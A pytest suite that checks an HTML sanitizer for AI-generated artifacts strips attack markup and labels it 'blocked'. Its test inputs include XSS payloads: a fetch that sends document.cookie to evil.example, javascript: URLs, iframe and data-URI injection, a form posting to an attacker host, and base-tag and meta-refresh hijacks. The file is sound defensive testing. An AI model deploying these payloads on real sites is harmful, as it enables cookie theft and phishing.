"""
Adversarial payload suite for artifact_generator.sanitize_html().

No DB, no LLM — this asserts the sanitizer neutralizes attack payloads
BEFORE persistence (sanitize_html() is called at generation time in
chat.py's transform flow, never only at render time — hard constraint).
The frontend's sandboxed iframe (sandbox="allow-scripts", no
allow-same-origin) is the second, independent layer; this file only tests
the first.

Each case asserts two things: (1) the specific dangerous substring is gone
from the cleaned output, and (2) security_status is "blocked" — the honest
label for "something dangerous had to be removed," never silently reported
as a clean "sanitized" pass.
"""
import bleach

from app.skills.artifact_generator import sanitize_html


def test_script_tag_with_external_src_is_neutralized():
    payload = '<script src="https://evil.example/payload.js"></script>'
    result = sanitize_html(payload)
    assert "evil.example" not in result.clean_html
    assert "src=" not in result.clean_html
    assert result.security_status == "blocked"


def test_inline_event_handler_onerror_is_stripped():
    payload = '<img src="x.png" onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">'
    result = sanitize_html(payload)
    assert "onerror" not in result.clean_html
    assert "evil.example" not in result.clean_html
    assert result.security_status == "blocked"


def test_inline_event_handler_onclick_is_stripped():
    payload = '<div onclick="window.location=\'https://evil.example\'">Click me</div>'
    result = sanitize_html(payload)
    assert "onclick" not in result.clean_html
    assert result.security_status == "blocked"


def test_javascript_url_in_href_is_neutralized():
    payload = '<a href="javascript:alert(document.cookie)">click here</a>'
    result = sanitize_html(payload)
    assert "javascript:" not in result.clean_html.lower()
    assert result.security_status == "blocked"


def test_vbscript_url_is_neutralized():
    payload = '<a href="vbscript:msgbox(1)">click</a>'
    result = sanitize_html(payload)
    assert "vbscript:" not in result.clean_html.lower()
    assert result.security_status == "blocked"


def test_iframe_escape_attempt_is_stripped_entirely():
    payload = '<iframe src="https://evil.example/phish"></iframe>'
    result = sanitize_html(payload)
    assert "<iframe" not in result.clean_html.lower()
    assert "evil.example" not in result.clean_html
    assert result.security_status == "blocked"


def test_nested_iframe_data_uri_html_injection_is_stripped():
    payload = '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'
    result = sanitize_html(payload)
    assert "<iframe" not in result.clean_html.lower()
    assert "data:text/html" not in result.clean_html.lower()
    assert result.security_status == "blocked"


def test_form_exfiltration_attempt_is_stripped():
    payload = '<form action="https://evil.example/collect" method="post"><input name="secret"></form>'
    result = sanitize_html(payload)
    assert "<form" not in result.clean_html.lower()
    assert "evil.example" not in result.clean_html
    assert result.security_status == "blocked"


def test_base_tag_hijack_is_stripped():
    payload = '<base href="https://evil.example/"><a href="/local">link</a>'
    result = sanitize_html(payload)
    assert "<base" not in result.clean_html.lower()
    assert result.security_status == "blocked"


def test_meta_refresh_redirect_is_stripped():
    payload = '<meta http-equiv="refresh" content="0;url=https://evil.example/">'
    result = sanitize_html(payload)
    assert "<meta" not in result.clean_html.lower()
    assert "evil.example" not in result.clean_html
    assert result.security_status == "blocked"


def test_object_embed_flash_style_payloads_are_stripped():
    payload = '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/y.swf">'
    result = sanitize_html(payload)
    assert "<object" not in result.clean_html.lower()
    assert "<embed" not in result.clean_html.lower()
    assert "evil.example" not in result.clean_html
    assert result.security_status == "blocked"


def test_script_with_no_src_survives_but_is_flagged_only_if_paired_with_other_threats():
    # An inline <script> with no external src is, on its own, exactly the
    # "genuinely interactive artifact" case the sandbox is designed to
    # allow -- it is NOT itself a threat pattern (the iframe sandbox is
    # what makes inline scripts safe, not stripping them).
    payload = "<script>let x = 1 + 1;</script>"
    result = sanitize_html(payload)
    assert "<script>" in result.clean_html
    assert result.security_status == "sanitized"


def test_multiple_stacked_threats_all_neutralized_in_one_pass():
    payload = (
        '<div onclick="evil()">'
        '<img src="x" onerror="alert(1)">'
        '<a href="javascript:alert(2)">click</a>'
        '<iframe src="https://evil.example"></iframe>'
        "</div>"
    )
    result = sanitize_html(payload)
    assert "onclick" not in result.clean_html
    assert "onerror" not in result.clean_html
    assert "javascript:" not in result.clean_html.lower()
    assert "<iframe" not in result.clean_html.lower()
    assert result.security_status == "blocked"


def test_benign_content_is_reported_sanitized_not_blocked():
    payload = '<div class="card"><h2>Growth Loops</h2><p>Some <strong>text</strong> and a <a href="https://lennysnewsletter.com">link</a>.</p></div>'
    result = sanitize_html(payload)
    assert "Growth Loops" in result.clean_html
    assert "lennysnewsletter.com" in result.clean_html
    assert result.security_status == "sanitized"
    assert result.flagged_patterns == []


def test_ordinary_words_containing_on_do_not_false_positive_as_event_handlers():
    # Regression test: an earlier version of the event-handler pattern
    # (on\w+\s*=, no word boundary) matched "on" as a mid-word substring,
    # so "content=" and "data-confirmation=" were misreported as
    # security_status="blocked" despite containing no real handler.
    for payload in (
        '<div data-content="hello">world</div>',
        '<div data-confirmation="yes">ok</div>',
        '<button type="submit">Send</button>',
    ):
        result = sanitize_html(payload)
        assert result.security_status == "sanitized", f"false positive on: {payload!r}"
        assert result.flagged_patterns == []


def test_benign_svg_content_survives():
    payload = '<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="blue"></circle></svg>'
    result = sanitize_html(payload)
    assert "<circle" in result.clean_html
    assert result.security_status == "sanitized"


def test_output_is_always_valid_input_to_bleach_reclean_idempotent():
    # Sanity check that sanitizing already-sanitized output doesn't change
    # it further (no residual dangerous markup survives round-tripping).
    payload = '<img src="x" onerror="alert(1)"><script src="https://evil.example/x.js"></script>'
    first_pass = sanitize_html(payload)
    second_pass = sanitize_html(first_pass.clean_html)
    assert second_pass.clean_html == first_pass.clean_html
    assert second_pass.security_status == "sanitized"  # nothing dangerous left to flag on the second pass